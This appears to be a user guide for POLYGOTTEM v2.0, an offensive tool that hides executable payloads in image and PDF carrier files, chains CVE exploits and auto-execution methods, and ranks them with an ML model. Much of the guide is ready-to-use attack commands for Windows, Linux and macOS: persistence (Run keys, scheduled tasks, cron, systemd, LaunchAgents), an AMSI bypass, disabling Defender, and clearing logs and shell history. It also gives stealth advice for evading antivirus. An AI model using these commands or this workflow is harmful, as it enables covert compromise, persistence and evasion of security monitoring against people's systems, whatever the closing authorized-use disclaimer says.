# POLYGOTTEM v2.0 - Polished Workflow Guide

## 🎨 Overview

POLYGOTTEM v2.0 features a completely redesigned interactive workflow with:
- **📁 File Browser** - No more typing paths!
- **🤖 AI Cascade Optimization** - Intel NPU/GPU powered
- **💻 OS-Specific Commands** - Windows, Linux, macOS
- **✨ Polished 12-Step Workflow** - Guided and intuitive

---

## 🚀 Quick Start

### Launch Enhanced Mode

```bash
cd /path/to/POLYGOTTEM

# Launch enhanced orchestrator
python tools/polyglot_orchestrator_enhanced.py
```

### What You'll Experience

1. **Beautiful banner** with feature highlights
2. **Step-by-step guidance** through the entire process
3. **File browsing** instead of typing paths
4. **AI recommendations** for optimal execution order
5. **Rich visual feedback** with emojis and colors
6. **Comprehensive results** with success rates

---

## 📁 File Browser

### Overview

The file browser lets you select files visually without typing paths.

### Features

- **📂 Directory Navigation** - Browse payloads/ directory
- **🔍 File Type Filtering** - Filter by images, documents, executables, etc.
- **📊 File Metadata** - Size, modified date, permissions
- **🎯 Multi-Select** - Select multiple files at once
- **⭐ Favorites** - Bookmark frequently used files
- **🕐 Recent Files** - Quick access to recently selected files
- **🎨 Visual Icons** - Different icons for each file type

### File Type Icons

- 🖼️ Images (PNG, JPEG, GIF, WebP, TIFF, BMP)
- 📄 Documents (PDF, DOC, TXT, RTF)
- ⚙️ Executables (EXE, DLL, SO, APP)
- 📝 Scripts (PY, JS, SH, PS1, VBS)
- 🎵 Audio (MP3, WAV, FLAC, OGG)
- 🎬 Video (MP4, AVI, MKV, MOV)
- 📦 Archives (ZIP, TAR, GZ, 7Z, RAR)

### Usage

**Step 1: Carrier Selection**
```
Select Carrier Type:
  1. 🖼️ Image - PNG, JPEG, GIF, WebP, TIFF, BMP
  2. 📄 Document - PDF, DOC, RTF
  3. 🎵 Audio - MP3, WAV, FLAC, OGG
  4. 🎬 Video - MP4, AVI, MKV
  5. 📝 Custom - Browse for any file type
```

**Step 2: File Browser**
```
Browsing: payloads/carriers/
Filter: images (.png, .jpg, .jpeg, .gif, .bmp, .webp, .tiff)

Current Selection:
  1. [ ] 🖼️ sample_image.png (1.2KB)
      Modified: 2025-11-11 10:30
  2. [ ] 🖼️ carrier.jpg (45.3KB)
      Modified: 2025-11-10 15:45

Navigation: Number = Select | Enter = Confirm | Folders = Navigate
```

**Step 3: File Info**
```
┌────────────────────────────────────────────┐
│ File Details                               │
├────────────────────────────────────────────┤
│ Name: sample_image.png                     │
│ Path: payloads/carriers/sample_image.png   │
│ Size: 1.2KB                                │
│ Type: image/png                            │
│ Modified: 2025-11-11 10:30:15              │
│ Permissions: 644                           │
└────────────────────────────────────────────┘
```

### Directory Structure

```
payloads/
├── carriers/          # Carrier files (PNG, PDF, etc.)
│   ├── sample_image.png
│   └── sample_document.pdf
├── samples/           # Sample payloads
│   ├── payloads/
│   │   ├── sample_shellcode.bin
│   │   └── sample_payload.sh
│   └── carriers/
│       ├── sample_image.png
│       └── sample_document.pdf
└── custom/            # Your custom files
```

---

## 🤖 AI Cascade Optimization

### Overview

AI-powered cascade optimizer uses machine learning to determine the best order for auto-execution methods.

### How It Works

1. **Environment Detection**
   - Platform (Windows, Linux, macOS)
   - Architecture (x86_64, ARM, etc.)
   - Installed software (bash, python, java, browsers, PDF readers)
   - User privileges (admin, user)
   - Network availability
   - Security software (AV, firewall)

2. **Feature Extraction**
   - Platform compatibility (0-1)
   - Software availability (0-1)
   - Base reliability (0-1)
   - Historical success rate (0-1)
   - Requires admin privileges (0 or 1)
   - Requires network (0 or 1)
   - AV evasion score (0-1)

3. **ML Inference**
   - 7-feature linear model
   - Weighted sum computation
   - Sigmoid activation function
   - **NPU/GPU accelerated** when available
   - Falls back to CPU if no acceleration

4. **Success Prediction**
   - Computes probability for each method
   - Sorts methods by probability
   - Displays optimization results

### Sample Output

```
═══════════════════════════════════════════════════════
AI-Powered Cascade Optimization
═══════════════════════════════════════════════════════

Detecting execution context...

Environment Context:
  Platform                 : linux
  Architecture             : x86_64
  Privileges               : user
  Network                  : Available

─── Optimized Cascade Order ────────────────────────────

┌──────┬────────────────────────────┬──────────────┬─────────────────┐
│ Rank │ Method                     │ Success Prob │ Reasoning       │
├──────┼────────────────────────────┼──────────────┼─────────────────┤
│ #1   │ HTML onload Event          │ 92.3%        │ Excellent match │
│ #2   │ Bash Shebang Script        │ 89.7%        │ Excellent match │
│ #3   │ PDF OpenAction + JavaScript│ 78.5%        │ Good match      │
│ #4   │ Python Shebang Script      │ 76.2%        │ Good match      │
│ #5   │ Desktop Entry File         │ 65.4%        │ Fair match      │
└──────┴────────────────────────────┴──────────────┴─────────────────┘

✓ Recommended: Start with 'HTML onload Event' (92.3% success probability)
```

### Learning System

The optimizer learns from every execution:
- Records success/failure for each method
- Tracks platform-specific success rates
- Updates weights based on historical data
- Stores data in `data/cascade_history.json`

**Example history data:**
```json
{
  "method_success_counts": {
    "html_onload": 45,
    "bash_shebang": 38,
    "pdf_openaction": 28
  },
  "method_failure_counts": {
    "office_macro": 12,
    "windows_lnk": 5
  },
  "platform_success": {
    "linux_html_onload": {"success": 45, "failure": 2},
    "linux_bash_shebang": {"success": 38, "failure": 1}
  }
}
```

### Hardware Acceleration

**Intel NPU (Meteor Lake+):**
- Neural Processing Unit acceleration
- 10-20x faster inference
- Lower power consumption

**Intel Arc GPU:**
- GPU-accelerated computation
- 5-10x faster than CPU
- Parallel processing

**CPU Fallback:**
- Works on any system
- No special hardware required
- Still very fast (<100ms)

---

## 💻 OS-Specific Commands

### Overview

Pre-configured command templates for Windows, Linux, and macOS.

### Command Categories

1. **Persistence** - Maintain access
2. **Execution** - Run commands
3. **Evasion** - Avoid detection
4. **Reconnaissance** - Gather information

### Windows Commands

**Persistence:**
```powershell
# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
  /v "SystemUpdate" /t REG_SZ /d "{command}" /f

# Scheduled Task
schtasks /create /tn "SystemUpdate" /tr "{command}"
  /sc onlogon /ru "SYSTEM" /f

# Startup Folder
copy "{executable}" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**Execution:**
```powershell
# PowerShell
powershell -ExecutionPolicy Bypass -Command "{command}"

# PowerShell Encoded
powershell -EncodedCommand {base64_command}

# HTA Application
mshta {hta_file}

# WScript
wscript {script_file}
```

**Evasion:**
```powershell
# AMSI Bypass
powershell -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

# Disable Windows Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

# Clear Event Logs
powershell -Command "wevtutil cl System; wevtutil cl Security; wevtutil cl Application"
```

**Reconnaissance:**
```powershell
# System Info
systeminfo

# User Info
whoami /all

# Network Info
ipconfig /all && netstat -ano

# Check AV
wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname
```

### Linux Commands

**Persistence:**
```bash
# Cron Job
echo "@reboot {command}" | crontab -

# Systemd Service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update

[Service]
ExecStart={command}

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service

# Bashrc
echo "{command}" >> ~/.bashrc

# XDG Autostart
mkdir -p ~/.config/autostart
cat > ~/.config/autostart/update.desktop << EOF
[Desktop Entry]
Type=Application
Name=Update
Exec={command}
EOF
```

**Execution:**
```bash
# Bash
bash -c "{command}"

# Python
python3 -c "{command}"

# Nohup (background)
nohup {command} &

# At (scheduled)
echo "{command}" | at now + 1 minute
```

**Evasion:**
```bash
# Clear History
history -c && rm -f ~/.bash_history

# Disable Logging
service rsyslog stop

# Clear Logs
rm -f /var/log/*.log

# Unset History
unset HISTFILE
```

**Reconnaissance:**
```bash
# System Info
uname -a && cat /etc/*release

# User Info
whoami && id

# Network Info
ifconfig -a && netstat -tulpn

# Process List
ps auxf

# Cron Jobs
crontab -l
```

### macOS Commands

**Persistence:**
```bash
# LaunchAgent
cat > ~/Library/LaunchAgents/com.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.update</string>
  <key>ProgramArguments</key>
  <array><string>{command}</string></array>
  <key>RunAtLoad</key><true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.update.plist

# Login Hook
sudo defaults write com.apple.loginwindow LoginHook {script_path}
```

**Execution:**
```bash
# Bash/Zsh
zsh -c "{command}"

# Python
python3 -c "{command}"

# AppleScript
osascript -e '{command}'
```

### Command Selection Workflow

**Step 1: Select Platform**
```
Select Target Platform:
  1. 🪟 Windows Commands
  2. 🐧 Linux Commands
  3. 🍎 macOS Commands
```

**Step 2: Select Category**
```
Select Command Category:
  1. Persistence - 5 commands available
  2. Execution - 8 commands available
  3. Evasion - 4 commands available
  4. Reconnaissance - 6 commands available
```

**Step 3: Select Commands**
```
Select Persistence Commands:
  1. [ ] Registry Run - Add key to HKCU\...\Run
  2. [ ] Scheduled Task - Create scheduled task for system startup
  3. [✓] Startup Folder - Copy executable to startup folder
  4. [ ] WMI Persistence - Create WMI event subscription

Space/Number = Toggle | A = All | N = None | Enter = Confirm
```

**Step 4: Enter Variables**
```
Command Variables:

Executable [payload.exe]: /path/to/malware.exe
```

**Step 5: Generated Command**
```
✓ Generated: startup_folder
Command: copy "/path/to/malware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## ✨ Complete Workflow

### The 12-Step Process

```
╔═══════════════════════════════════════════════════════════╗
║         POLYGOTTEM v2.0 Enhanced Workflow                 ║
╚═══════════════════════════════════════════════════════════╝

Step 1:  📁 Select Carrier File
Step 2:  💾 Select Payload Source (Files/Commands/Both)
Step 3:  🎯 Select CVE Exploits
Step 4:  ⚙️ Select Auto-Execution Methods
Step 5:  🤖 AI-Powered Cascade Optimization
Step 6:  🔒 Configure Encryption
Step 7:  🔄 Configure Redundancy
Step 8:  👀 Review Configuration
Step 9:  🏗️ Generate Polyglot
Step 10: 🚀 Execute Cascade
Step 11: 📊 Show Results
Step 12: 📖 Record Results for ML
```

### Step-by-Step Example

**Step 1: Select Carrier**
```
═══════════════════════════════════════════════════════════
STEP 1: Select Carrier File
═══════════════════════════════════════════════════════════

Choose the file type that will carry your polyglot

Select Carrier Type:
  1. 🖼️ Image
     PNG, JPEG, GIF, WebP, TIFF, BMP
  2. 📄 Document
     PDF, DOC, RTF

Your choice [1-5]: 1

[File browser opens...]

✓ Selected carrier: sample_image.png
```

**Step 2: Select Payload Source**
```
═══════════════════════════════════════════════════════════
STEP 2: Select Payload Source
═══════════════════════════════════════════════════════════

Choose where your payload comes from

Select Payload Source:
  1. 📁 File(s)
     Browse and select payload file(s) to embed
  2. 💻 Command
     Execute OS-specific command(s)
  3. 🔀 Both
     Combine files and commands

Your choice [1-3]: 3

[File browser + Command selector...]

✓ Selected 2 payload file(s)
✓ Selected 3 command(s)
```

**Step 3-12: Continue through workflow...**

---

## 🎯 Best Practices

### For Maximum Success Rate

1. **Use AI Optimization**
   - Always enable AI cascade ordering
   - Let the system learn from results
   - Trust the probability rankings

2. **Select Multiple Methods**
   - Choose 5-10 execution methods
   - Mix different types (document, script, binary)
   - Include high-reliability methods

3. **Enable Redundancy**
   - Use "Try All Methods" for maximum coverage
   - Enable validation before execution
   - Generate fallback files

4. **Apply Encryption**
   - Use 3-5 layers
   - Mix single-byte and multi-byte keys
   - Include TeamTNT signatures

### For Stealth

1. **Document-Based Methods**
   - PDF OpenAction (looks innocent)
   - HTML meta refresh (browser-based)
   - Office macros (if target uses Office)

2. **Minimal Methods**
   - Select 2-3 methods only
   - Use "Stop on First Success"
   - Avoid noisy methods

3. **Heavy Encryption**
   - 5+ layers
   - Custom XOR keys
   - Avoid known signatures

### For Testing/Research

1. **Try Everything**
   - Select all available methods
   - Use "Try All Methods"
   - Record all results

2. **Learn from Results**
   - Check success rates
   - Analyze which methods work
   - Let ML learn from your tests

3. **Document Findings**
   - Note platform differences
   - Track success rates
   - Share with team

---

## 📊 Results Interpretation

### Success Rate

```
Execution Results
┌──────────────────┬───────────────┬────────┐
│ Metric           │ Value         │ Status │
├──────────────────┼───────────────┼────────┤
│ Total Attempts   │ 8             │ ✓      │
│ Succeeded        │ 6             │ ✓      │
│ Failed           │ 2             │ ✗      │
│ Files Generated  │ 6             │ ✓      │
└──────────────────┴───────────────┴────────┘

✓ Excellent success rate: 75.0%
```

**Interpretation:**
- **75%+** - Excellent! Most methods work
- **50-74%** - Good, some methods succeeded
- **25-49%** - Fair, limited success
- **<25%** - Poor, environment issues

### Generated Files

```
Generated files:
  └─ /tmp/tmpXYZ123.html
  └─ /tmp/tmpABC456.sh
  └─ /tmp/tmpDEF789.pdf
  └─ /tmp/tmpGHI012.py
  └─ /tmp/tmpJKL345.desktop
  └─ /tmp/tmpMNO678.jar
```

Each file is a complete auto-execution vector ready to use.

---

## 🔧 Troubleshooting

### File Browser Issues

**Issue: No files shown**
```
Solution: Add files to payloads/ directory or generate samples
```

**Issue: Can't navigate to parent**
```
Solution: You're at the root (payloads/), navigate into subdirectories first
```

### AI Optimization Issues

**Issue: All methods have low probability**
```
Solution: Your environment may not match common setups
- Check installed software
- Verify privileges (admin vs user)
- Consider using cross-platform methods
```

**Issue: AI doesn't improve over time**
```
Solution: Need more execution history
- Run more tests
- Ensure results are being recorded
- Check data/cascade_history.json exists
```

### Command Execution Issues

**Issue: Variables not prompting**
```
Solution: Command template has no variables
- Check the command uses {variable} syntax
- Example: cmd /c {command}
```

**Issue: Command doesn't work on target**
```
Solution: Wrong platform selected
- Verify target OS matches selected profile
- Test commands manually first
- Check syntax for platform
```

---

## 🎓 Advanced Usage

### Custom Commands

Add your own commands to the executor:

```python
from tools.command_executor import CommandExecutor

executor = CommandExecutor()

# Add custom command
executor.profiles['windows']['categories']['custom']['my_command'] = (
    'powershell -Command "Write-Host {message}"'
)

# Use it
commands = executor.select_commands(executor.profiles['windows'])
```

### Programmatic File Selection

```python
from tools.file_browser import FileBrowser
from pathlib import Path

browser = FileBrowser()

# Get specific file
carrier = Path("payloads/carriers/sample.png")

# Or browse interactively
carrier = browser.browse_for_carrier('image')
```

### Custom ML Models

```python
from tools.cascade_optimizer import CascadeOptimizer

optimizer = CascadeOptimizer()

# Override inference
def custom_inference(features):
    # Your ML model here
    return probability

optimizer._accelerated_inference = custom_inference
```

---

## 📚 Additional Resources

- **Full Documentation:** [INTERACTIVE_TUI_FEATURES.md](INTERACTIVE_TUI_FEATURES.md)
- **Quick Start:** [QUICK_START_INTERACTIVE.md](QUICK_START_INTERACTIVE.md)
- **Changelog:** [CHANGELOG_INTERACTIVE_TUI.md](../CHANGELOG_INTERACTIVE_TUI.md)
- **Auto-Execution Analysis:** [AUTO_EXECUTION_ANALYSIS.md](AUTO_EXECUTION_ANALYSIS.md)

---

## ⚠️ Legal Notice

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool must only be used:
- With written authorization
- In controlled environments
- For educational/research purposes
- For authorized penetration testing
- For CTF competitions
- For defensive security

**NEVER use without:**
- Explicit permission
- Proper legal framework
- Controlled test environment

The authors are not responsible for misuse.

---

**POLYGOTTEM v2.0** - Polished Interactive Polyglot Generator
SWORDIntel Team | 2025-11-11
